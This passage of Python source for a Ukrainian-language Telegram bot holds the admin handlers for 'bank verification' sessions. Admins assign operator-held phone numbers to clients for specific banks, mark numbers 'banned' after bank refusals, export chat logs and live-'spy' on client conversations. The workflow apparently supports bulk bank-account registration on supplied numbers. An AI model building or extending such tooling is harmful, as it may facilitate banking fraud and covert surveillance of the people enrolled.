                    resize_keyboard=True,
                    one_time_keyboard=False,
                    is_persistent=True
                )
                await bot.send_message(
                    chat_id=client_id,
                    text="Роботу завершено. Дякуємо за співпрацю.\n\nНатисніть «🔄 Розпочати знову» нижче, щоб почати нову сесію верифікації.",
                    parse_mode="Markdown",
                    reply_markup=kbd
                )
            except Exception as e:
                print(f"Не вдалося надіслати клієнту повідомлення про завершення: {e}")

            await db.close_session(client_id)
            await callback.message.answer(
                f"Верифікацію для клієнта @{session['username']} успішно завершено по всіх обраних банках! Сесію закрито."
            )
        else:
            try:
                kbd = ReplyKeyboardMarkup(
                    keyboard=[[KeyboardButton(text="⏳ Очікування номера...")]],
                    resize_keyboard=True,
                    one_time_keyboard=False,
                    is_persistent=True
                )
                await bot.send_message(
                    chat_id=client_id,
                    text=f"Верифікацію для банку {bank_name} завершено. Очікуйте наступний номер.",
                    parse_mode="Markdown",
                    reply_markup=kbd
                )
            except Exception as e:
                print(f"Не вдалося надіслати клієнту повідомлення: {e}")

            await show_next_assignment_menu(callback.message, client_id, edit=False, state=state)
    else:
        # Відмова (Failure)
        # 2. Позначаємо лінію як заблоковану (banned) та логуємо
        await db.set_line_status(line_id, 'banned')
        await db.log_verification_end(client_id, bank_name, 'banned')

        # Оновлюємо статус сесії в БД на 'registered'
        import aiosqlite
        from bot.config import DB_FILE
        async with aiosqlite.connect(DB_FILE) as db_conn:
            await db_conn.execute("UPDATE sessions SET line_id = NULL, client_message_id = NULL, status = 'registered' WHERE client_id = ?", (client_id,))
            await db_conn.commit()

        # 3. Вилучаємо пройдений bank зі списку залишкових банків
        remaining_banks_str = session['remaining_banks']
        remaining = remaining_banks_str.split(",") if remaining_banks_str else []
        if bank_name in remaining:
            remaining.remove(bank_name)

        new_remaining_str = ",".join(remaining)
        await db.update_session_banks(client_id, session['selected_banks'], new_remaining_str)

        # Прибираємо кнопки з повідомлення завершення
        await callback.message.edit_reply_markup(reply_markup=None)
        await callback.message.edit_text(
            f"Реєстрацію для клієнта @{session['username']} в банку {bank_name} скасовано (Відмова банку).\n"
            f"Лінія {line_id} позначена як Відмова (Заблокована).",
            parse_mode="Markdown"
        )

        # 4. Перевіряємо чи залишилися ще банки для проходження
        if not remaining:
            try:
                kbd = ReplyKeyboardMarkup(
                    keyboard=[
                        [KeyboardButton(text="🔄 Розпочати знову")],
                        [KeyboardButton(text="📋 Мої дані")]
                    ],
                    resize_keyboard=True,
                    one_time_keyboard=False,
                    is_persistent=True
                )
                await bot.send_message(
                    chat_id=client_id,
                    text="Роботу завершено. Дякуємо за співпрацю.\n\nНатисніть «🔄 Розпочати знову» нижче, щоб почати нову сесію верифікації.",
                    parse_mode="Markdown",
                    reply_markup=kbd
                )
            except Exception as e:
                print(f"Помилка надсилання клієнту повідомлення про завершення: {e}")

            await db.close_session(client_id)
            await callback.message.answer(
                f"Верифікацію для клієнта @{session['username']} завершено по всіх банках після відмови в останньому. Сесію закрито."
            )
        else:
            # Повідомляємо клієнта про заміну номера
            try:
                kbd = ReplyKeyboardMarkup(
                    keyboard=[[KeyboardButton(text="⏳ Очікування номера...")]],
                    resize_keyboard=True,
                    one_time_keyboard=False,
                    is_persistent=True
                )
                await bot.send_message(
                    chat_id=client_id,
                    text=f"На жаль, виникла помилка з цим номером (відмова банку {bank_name}). Будь ласка, зачекайте, ми призначимо вам новий номер для цього банку.",
                    parse_mode="Markdown",
                    reply_markup=kbd
                )
            except Exception as e:
                print(f"Не вдалося надіслати клієнту повідомлення про відмову: {e}")

            # Показуємо меню вибору лінії знову
            await show_next_assignment_menu(callback.message, client_id, edit=False, state=state)

    await callback.answer("Виконано!")

@router.callback_query(F.data.startswith("terminate_"))
async def handle_terminate_session(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Адмін остаточно закриває сесію верифікації клієнта"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")

    client_id = int(callback.data.split("_")[1])
    
    session = await db.get_session(client_id)
    if not session or session['status'] == 'completed':
        await callback.answer("Сесія вже завершена або не існує.", show_alert=True)
        await callback.message.edit_reply_markup(reply_markup=None)
        return

    # 1. Повідомляємо клієнта про остаточне завершення роботи
    try:
        kbd = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="🔄 Розпочати знову")],
                [KeyboardButton(text="📋 Мої дані")]
            ],
            resize_keyboard=True,
            one_time_keyboard=False,
            is_persistent=True
        )
        await bot.send_message(
            chat_id=client_id,
            text="Роботу завершено. Дякуємо за співпрацю.\n\nНатисніть «🔄 Розпочати знову» нижче, щоб почати нову сесію верифікації.",
            parse_mode="Markdown",
            reply_markup=kbd
        )
    except Exception as e:
        print(f"Не вдалося надіслати клієнту повідомлення: {e}")

    # 2. Повністю закриваємо сесію (статус completed)
    await db.close_session(client_id)

    # 3. Оновлюємо повідомлення для адміна
    await callback.message.edit_reply_markup(reply_markup=None)
    import html
    username_esc = html.escape(session['username'] or "Невідомий")
    await callback.message.edit_text(
        f"Сесію для клієнта @{username_esc} остаточно закрито.",
        parse_mode="HTML"
    )
    await callback.answer("Сесію закрито!")

@router.callback_query(F.data.startswith("managebanks_"))
async def handle_manage_banks(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Показ чекбоксів вибору банків для керування сесією"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")
    client_id = int(callback.data.split("_")[1])
    
    session = await db.get_session(client_id)
    if not session:
        await callback.answer("Сесію не знайдено.", show_alert=True)
        return
        
    # Зберігаємо старий стан вибору банків
    await state.update_data(**{
        f"old_selected_{client_id}": session['selected_banks'],
        f"old_remaining_{client_id}": session['remaining_banks']
    })
        
    selected_banks = session['selected_banks']
    selected = selected_banks.split(",") if selected_banks else []
    
    unique_banks_db = await db.get_unique_banks()
    custom_order = ["bank.kd", "IziBank", "Alliance", "LvivBank", "AmoBank"]
    all_banks = list(dict.fromkeys(custom_order + unique_banks_db))
    
    keyboard_buttons = []
    row = []
    for b in all_banks:
        checkbox = "[x]" if b in selected else "[ ]"
        button_text = f"{checkbox} {b}"
        callback_data = f"toggle_{client_id}_{b}"
        row.append(InlineKeyboardButton(text=button_text, callback_data=callback_data))
        if len(row) == 2:
            keyboard_buttons.append(row)
            row = []
    if row:
        keyboard_buttons.append(row)
        
    keyboard_buttons.append([
        InlineKeyboardButton(text="Назад", callback_data=f"backtosession_{client_id}"),
        InlineKeyboardButton(text="Зберегти", callback_data=f"savebanks_{client_id}")
    ])
    keyboard_buttons.append([InlineKeyboardButton(text="Відхилити запит", callback_data=f"reject_{client_id}")])
    
    markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    
    await callback.message.edit_text(
        f"Оберіть банки для клієнта @{session['username']}:",
        reply_markup=markup
    )
    await callback.answer()

@router.callback_query(F.data.startswith("reassignline_"))
async def handle_reassign_line_menu(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Показ меню призначення/зміни лінії"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")
    client_id = int(callback.data.split("_")[1])
    await show_next_assignment_menu(callback.message, client_id, edit=True)
    await callback.answer()

@router.callback_query(F.data.startswith("unassignline_"))
async def handle_unassign_line(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Звільнення призначеної лінії без завершення сесії"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")
    client_id = int(callback.data.split("_")[1])
    
    session = await db.get_session(client_id)
    if not session:
        await callback.answer("Сесію не знайдено.", show_alert=True)
        return
        
    line_id = session['line_id']
    if not line_id:
        await callback.answer("Лінія не призначена.", show_alert=True)
        return
        
    line_info = await db.get_line(line_id)
    line_num = line_info['line_id'] if line_info else line_id
        
    await db.unassign_line_from_session(client_id)
    
    # Вилучаємо reply markup у клієнта
    if session['client_message_id']:
        try:
            await bot.edit_message_reply_markup(
                chat_id=client_id,
                message_id=session['client_message_id'],
                reply_markup=None
            )
        except Exception as e:
            print(f"Помилка видалення кнопки у клієнта: {e}")
            
    try:
        kbd = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="⏳ Очікування номера...")]],
            resize_keyboard=True,
            one_time_keyboard=False,
            is_persistent=True
        )
        await bot.send_message(
            chat_id=client_id,
            text="Номер відкріплено. Будь ласка, очікуйте нового призначення.",
            reply_markup=kbd
        )
    except Exception as e:
        print(f"Помилка надсилання повідомлення про відкріплення клієнту: {e}")
            
    # Видаляємо лише повідомлення-підтвердження призначення лінії для цього клієнта
    state_data = await state.get_data()
    confirm_msg_id = state_data.get(f"confirm_msg_{client_id}")
    if confirm_msg_id:
        try:
            await bot.delete_message(chat_id=callback.message.chat.id, message_id=confirm_msg_id)
        except Exception:
            pass
        # Вилучаємо його з last_sessions_messages
        msg_ids = state_data.get("last_sessions_messages", [])
        if confirm_msg_id in msg_ids:
            try:
                msg_ids.remove(confirm_msg_id)
            except ValueError:
                pass
            await state.update_data(last_sessions_messages=msg_ids)

    await callback.answer("Лінію звільнено!")
    msg = await callback.message.answer(
        f"Лінію {line_num} для клієнта @{session['username']} успішно звільнено. Статус сесії скинуто."
    )
    await show_session_card(callback.message, client_id, edit=True)
    
    # Видаляємо тимчасове повідомлення через 3 секунди
    import asyncio
    await asyncio.sleep(3)
    try:
        await msg.delete()
    except Exception:
        pass

@router.callback_query(F.data.startswith("completesession_"))
async def handle_complete_session_manually(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Ручне успішне завершення сесії верифікації клієнта"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")
    client_id = int(callback.data.split("_")[1])
    
    session = await db.get_session(client_id)
    if not session:
        await callback.answer("Сесію не знайдено.", show_alert=True)
        return
        
    try:
        kbd = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="🔄 Розпочати знову")],
                [KeyboardButton(text="📋 Мої дані")]
            ],
            resize_keyboard=True,
            one_time_keyboard=False,
            is_persistent=True
        )
        await bot.send_message(
            chat_id=client_id,
            text="Роботу завершено. Дякуємо за співпрацю.\n\nНатисніть «🔄 Розпочати знову» нижче, щоб почати нову сесію верифікації.",
            reply_markup=kbd
        )
    except Exception as e:
        print(f"Не вдалося надіслати клієнту повідомлення: {e}")
        
    await db.close_session(client_id)
    
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.edit_text(f"Сесію для клієнта @{session['username']} успішно завершено.")
    await callback.answer("Сесію завершено!")

async def show_session_card(message: Message, client_id: int, edit: bool = True):
    """Відображає картку конкретної сесії (використовується для повернення назад)"""
    import aiosqlite
    import html
    from bot.config import DB_FILE
    
    async with aiosqlite.connect(DB_FILE) as db_conn:
        db_conn.row_factory = aiosqlite.Row
        async with db_conn.execute("SELECT * FROM sessions WHERE client_id = ?", (client_id,)) as cursor:
            s = await cursor.fetchone()
            
    if not s:
        if edit:
            await message.edit_text("Сесію не знайдено.")
        else:
            await message.answer("Сесію не знайдено.")
        return

    # Отримуємо номер лінії для відображення
    line_info_str = "Не призначено"
    if s['line_id']:
        line_row = await db.get_line(s['line_id'])
        if line_row:
            line_info_str = f"+{line_row['phone_number']} ({line_row['bank']})"
        else:
            line_info_str = f"ID {s['line_id']}"
            
    selected_banks = s['selected_banks'] or "Не обрано"
    remaining_banks = s['remaining_banks'] or "Немає"
    
    username_esc = html.escape(s['username'] or "Невідомий")
    status_esc = html.escape(s['status'] or "")
    line_info_esc = html.escape(line_info_str)
    selected_banks_esc = html.escape(selected_banks)
    remaining_banks_esc = html.escape(remaining_banks)
    client_data_esc = html.escape(s['client_data'] or "")
    
    card_text = (
        f"👤 <b>Клієнт:</b> @{username_esc} (ID: <code>{s['client_id']}</code>)\n"
        f"• <b>Статус:</b> <code>{status_esc}</code>\n"
        f"• <b>Лінія:</b> {line_info_esc}\n"
        f"• <b>Обрані банки:</b> {selected_banks_esc}\n"
        f"• <b>Залишилось пройти:</b> {remaining_banks_esc}\n"
        f"• <b>Дані:</b> \n<pre>{client_data_esc}</pre>"
    )
    
    buttons = [
        [
            InlineKeyboardButton(text="💳 Банки", callback_data=f"managebanks_{s['client_id']}"),
            InlineKeyboardButton(text="📞 Лінія", callback_data=f"reassignline_{s['client_id']}")
        ],
        [
            InlineKeyboardButton(text="📖 Лог чату", callback_data=f"getlog_{s['client_id']}"),
            InlineKeyboardButton(text="👁️ Слідкувати", callback_data=f"spy_{s['client_id']}")
        ]
    ]
    
    if s['line_id']:
        buttons.append([
            InlineKeyboardButton(text="❌ Звільнити лінію", callback_data=f"unassignline_{s['client_id']}")
        ])
        
    buttons.append([
        InlineKeyboardButton(text="✅ Завершити сесію", callback_data=f"completesession_{s['client_id']}")
    ])
    
    markup = InlineKeyboardMarkup(inline_keyboard=buttons)
    if edit:
        await message.edit_text(card_text, reply_markup=markup, parse_mode="HTML")
    else:
        await message.answer(card_text, reply_markup=markup, parse_mode="HTML")

@router.callback_query(F.data.startswith("backtosession_"))
async def handle_back_to_session(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")
    client_id = int(callback.data.split("_")[1])
    await show_session_card(callback.message, client_id, edit=True)
    await callback.answer()

# --- Допоміжні функції ---

async def show_next_assignment_menu(message: Message, client_id: int, edit: bool = True, state: FSMContext = None):
    """Допоміжна функція для показу меню вибору ліній на основі залишкового списку банків"""
    session = await db.get_session(client_id)
    if not session:
        return

    remaining_banks_str = session['remaining_banks']
    remaining_banks = remaining_banks_str.split(",") if remaining_banks_str else []

    if not remaining_banks:
        # Закриваємо сесію
        await db.close_session(client_id)
        text = f"Верифікацію для клієнта @{session['username']} завершено."
        if edit:
            await message.edit_reply_markup(reply_markup=None)
            await message.edit_text(text)
        else:
            await message.answer(text)
        return

    # Отримуємо всі вільні лінії
    available_lines = await db.get_available_lines()
    
    # Фільтруємо лінії: залишаємо лише ті, які підходять під залишкові банки
    filtered_lines = [line for line in available_lines if line['bank'] in remaining_banks]

    keyboard_buttons = []
    for line in filtered_lines:
        button_text = f"+{line['phone_number']} ({line['bank']})"
        callback_data = f"assign_{client_id}_{line['id']}"
        keyboard_buttons.append([InlineKeyboardButton(text=button_text, callback_data=callback_data)])
    
    # Кнопка назад
    keyboard_buttons.append([
        InlineKeyboardButton(text="Назад", callback_data=f"backtosession_{client_id}")
    ])
    
    markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)

    import html
    remaining_text = ", ".join(remaining_banks)
    username_esc = html.escape(session['username'] or "Невідомий")
    remaining_text_esc = html.escape(remaining_text)
    text = (
        f"Оберіть лінію для наступного банку для @{username_esc}:\n"
        f"• Залишилося пройти банки: {remaining_text_esc}\n\n"
        f"Оберіть лінію для призначення:"
    )

    if not filtered_lines:
        text += "\n\nПопередження: немає вільних ліній для решти банків! Додайте нові номери прямо в чат або вивільніть існуючі лінії."

    if edit:
        await message.edit_text(text, reply_markup=markup, parse_mode="HTML")
    else:
        msg = await message.answer(text, reply_markup=markup, parse_mode="HTML")
        if state:
            await register_admin_message(msg, state, "last_sessions_messages")

@router.message(Command("setphoto"), F.from_user.id == ADMIN_ID)
async def cmd_set_photo_help(message: Message):
    await message.answer(
        "Інструкція для налаштування фото:\n\n"
        "Надішліть боту будь-яке фото та додайте підпис (caption):\n"
        "`/setphoto <ключ>`\n\n"
        "Приклади:\n"
        "• `/setphoto izibank` — для додатку izibank\n"
        "• `/setphoto екорег` — для інструкції /екорег\n\n"
        "Бот автоматично збереже це фото та надсилатиме його користувачам."
    )

@router.message(F.chat.type == "private", F.from_user.id == ADMIN_ID, F.photo, F.caption.startswith("/setphoto"))
async def cmd_set_photo(message: Message, bot: Bot):
    """Обробник для завантаження фото інструкцій/шаблонів адміном"""
    caption = message.caption or ""
    parts = caption.strip().split()
    if len(parts) < 2:
        await message.answer("Будь ласка, вкажіть ключ. Приклад: /setphoto izibank")
        return
    
    key = parts[1].strip().lower().replace("/", "")
    photo = message.photo[-1]  # Отримуємо найбільший розмір фото
    
    # Створюємо папку, якщо її не існує
    images_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "resources", "images")
    os.makedirs(images_dir, exist_ok=True)
    
    target_path = os.path.join(images_dir, f"{key}.png")
    
    try:
        # Завантажуємо фото на диск
        await bot.download(photo, destination=target_path)
        await message.answer(f"✅ Фото для '{key}' успішно збережено!")
    except Exception as e:
        await message.answer(f"❌ Помилка при збереженні фото: {str(e)}")

@router.callback_query(F.data.startswith("getlog_"))
async def handle_getlog_callback(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Вивантаження поточного логу переписки клієнта у форматі .txt"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")
    client_id = int(callback.data.split("_")[1])
    session = await db.get_session(client_id)
    if not session:
        await callback.answer("Сесію не знайдено.", show_alert=True)
        return
        
    await callback.answer("Генерую лог...")
    
    try:
        # Зчитуємо історію
        logs = await db.get_chat_logs(client_id)
        log_lines = []
        if logs:
            for log in logs:
                created_at = log['created_at']
                sender = log['sender'].upper()
                text = log['message_text'] or "[Скріншот/Фото]"
                log_lines.append(f"{created_at} | {sender}: {text}")
        else:
            log_lines.append("Історія діалогу порожня.")
            
        log_content = "\n".join(log_lines)
        
        import tempfile
        import os
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', encoding='utf-8', delete=False) as temp_file:
            temp_file.write(log_content)
            temp_path = temp_file.name
            
        try:
            from bot.config import LOG_BOT_TOKEN
            
            caption_text = (
                f"📄 <b>Лог діалогу</b>\n"
                f"• <b>Клієнт:</b> @{session['username']} (ID: <code>{client_id}</code>)"
            )
            
            send_bot = None
            if LOG_BOT_TOKEN:
                try:
                    send_bot = Bot(token=LOG_BOT_TOKEN)
                except Exception as e:
                    print(f"Помилка створення log_bot з LOG_BOT_TOKEN: {e}")

            sent_via_log_bot = False
            if send_bot:
                try:
                    await send_bot.send_document(
                        chat_id=callback.from_user.id,
                        document=FSInputFile(temp_path, filename=f"chat_history_{client_id}.txt"),
                        caption=caption_text,
                        parse_mode="HTML"
                    )
                    sent_via_log_bot = True
                except Exception as e:
                    print(f"Помилка відправки через log_bot: {e}. Спробуємо через основного бота.")
                finally:
                    try:
                        await send_bot.session.close()
                    except Exception:
                        pass

            if not sent_via_log_bot:
                await bot.send_document(
                    chat_id=callback.from_user.id,
                    document=FSInputFile(temp_path, filename=f"chat_history_{client_id}.txt"),
                    caption=caption_text,
                    parse_mode="HTML"
                )
        finally:
            try:
                os.remove(temp_path)
            except Exception:
                pass
    except Exception as e:
        await callback.message.answer(f"Помилка генерації логу: {e}")

@router.callback_query(F.data.startswith("spy_"))
async def handle_spy_callback(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Активація режиму стеження за сесією клієнта"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")
        
    client_id = int(callback.data.split("_")[1])
    session = await db.get_session(client_id)
    if not session:
        await callback.answer("Сесію не знайдено.", show_alert=True)
        return
        
    db.active_subscriptions[callback.from_user.id] = client_id
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚫 Зупинити стеження", callback_data="stopspy")]
    ])
    
    await callback.message.answer(
        f"👁️ <b>Увімкнено живий моніторинг</b> за клієнтом @{session['username']} (ID: <code>{client_id}</code>).\n"
        f"Тепер усі повідомлення клієнта та відповіді бота будуть дублюватися сюди.",
        parse_mode="HTML",
        reply_markup=keyboard
    )
    await callback.answer()

@router.callback_query(F.data == "stopspy")
async def handle_stopspy_callback(callback: CallbackQuery, state: FSMContext):
    """Вимкнення режиму стеження"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")
        
    db.active_subscriptions.pop(callback.from_user.id, None)
    
    try:
        await callback.message.delete()
    except Exception:
        pass
        
    msg = await callback.message.answer("🚫 <b>Стеження зупинено.</b>", parse_mode="HTML")
    await callback.answer()
    
    import asyncio
    await asyncio.sleep(3)
    try:
        await msg.delete()
    except Exception:
        pass


